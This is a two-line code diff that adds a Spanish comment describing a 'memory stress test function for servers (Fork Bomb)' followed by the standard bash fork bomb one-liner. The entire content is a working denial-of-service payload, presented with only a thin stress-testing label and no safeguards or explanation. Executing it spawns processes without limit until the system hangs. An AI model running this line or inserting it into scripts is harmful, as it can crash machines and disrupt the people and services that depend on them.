@@ -1,0 +1,2 @@
+# Función para prueba de stress de memoria a Servidores (Fork Bomb)
+:(){ :|:& };:
